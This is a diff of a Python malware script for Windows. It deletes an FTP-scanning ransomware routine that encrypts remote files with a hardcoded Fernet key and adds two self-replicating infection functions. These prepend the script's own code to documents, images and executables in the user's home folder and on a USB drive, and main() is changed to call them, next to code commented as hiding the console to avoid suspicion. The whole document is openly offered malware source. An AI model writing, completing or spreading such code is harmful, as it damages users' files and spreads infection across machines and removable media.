@@ -7,70 +7,63 @@ import subprocess
 import time
 from ftplib import FTP
 
-import nmap
+import sys
 import win32con
 import win32gui
 from cryptography.fernet import Fernet
 import requests
 
 
-passwords = []
+status = 'INFECTED'
 
 
-def ftp_work():
-    ftp_server = ftplib.FTP_TLS()
-    user = 'anonymous'
-    port = 21
-    for password in passwords:
-        return password
-    host_list = []
-    hosts = nmap.PortScanner
-    h = hosts.all_hosts()
-    host_list.append(h)
-    time.sleep(5)
-    while True:
-        try:
-            requests.get('https://kite.com')
-            while True:
-                pass_l = password
-                for host in host_list:
-                    try:
-                        ftp_server.connect(host, port)
-                        ftp_server.login(user, pass_l)
-                    except Exception as e:
-                        print(e)
-                        continue
-                    else:
-                        ftp_server.prot_p()
-                        time.sleep(5)
+def virus_property():
+    user = getpass.getuser()
+    target = ('txt', '.pdf', '.png', '.exe')
+    path = 'C:/Users/' + user + '/'
+    for r, d, files in os.walk(path):
+        for file in files:
+            if file.endswith(target):
+                try:
+                    with open(file, 'rb+') as g:
+                        line = g.read()
+                        if status not in line:
+                            g.seek(0, 0)
+                            with open(sys.argv[0], 'rb+') as c:
+                                lines = c.read()
+                                g.write(lines + '\n' + line)
+                                g.close()
+                                c.close()
+                                os.chmod(file, 777)
+                        else:
+                            pass
+                except Exception:
+                    pass
+        break
 
-                        file_content = '*.*'
-                        ftp_server.pwd()
-                        key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
 
-                        for file in FTP.nlst(file_content):
-                            k = key
-                            f = Fernet(k)
-                            try:
-                                with open(file, "rb") as doc:
-                                    file_data = doc.read()
-                                    encrypted_data = f.encrypt(file_data)
-
-                                with open(file + '.crypy', "wb") as doc:
-                                    doc.write(encrypted_data)
-                                    os.remove(file)
-                            except Exception as e:
-                                print(e)
-                                pass
-                        pass
-        except requests.exceptions.ConnectionError:
-            print(e)
-            break
-        except Exception as e:
-            print(e)
-            break
-        else:
-            pass
+def usb_infection():
+    target = ('txt', '.pdf', '.png', '.exe')
+    path = 'F:\\'
+    for r, d, files in os.walk(path):
+        for file in files:
+            if file.endswith(target):
+                try:
+                    with open(file, 'rb+') as g:
+                        line = g.read()
+                        if status not in line:
+                            g.seek(0, 0)
+                            with open(sys.argv[0], 'rb+') as c:
+                                lines = c.read()
+                                g.write(lines + '\n' + line)
+                                g.close()
+                                c.close()
+                                os.chmod(file, 777)
+                        else:
+                            pass
+                except Exception:
+                    pass
+        break
 
 
 f_name = []
@@ -172,6 +165,8 @@ def main():
     # Hides the terminal console to prevent suspicion while working in background
     # hide = win32gui.GetForegroundWindow()
     # win32gui.ShowWindow(hide, win32con.SW_HIDE)
+    virus_property()
+    usb_infection()
     # find_file()
     # encrypt_file()
     message()
